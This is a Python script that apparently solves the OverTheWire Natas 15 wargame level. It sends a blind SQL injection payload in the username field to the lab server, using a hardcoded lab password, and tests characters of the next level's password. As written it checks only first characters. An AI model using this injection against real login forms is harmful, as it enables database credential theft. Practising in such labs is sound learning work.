import time
import requests
from requests.auth import HTTPBasicAuth

max_retries = 5
retry_delay_seconds = 1
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

for char in chars:
    Data = {'username': 'natas16" and password LIKE BINARY "' + char + '%" #'}
    
    retries_left = max_retries
    
    while retries_left > 0:        
        try:
            r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', 
                              auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), 
                              data=Data)
            print(f'Testing character: {char}')
            
        except requests.exceptions.RequestException as e:
            retries_left -= 1
            if retries_left > 2:
                time.sleep(retry_delay_seconds)                
                continue
            
            else:
                raise Exception(f'Failed to connect after {max_retries} attempts. Error details: {str(e)}')
        
        # If the request was successful break out of the retry loop.
        break
        
    if 'exists' in r.text: 
        print(f'Found character: {char}')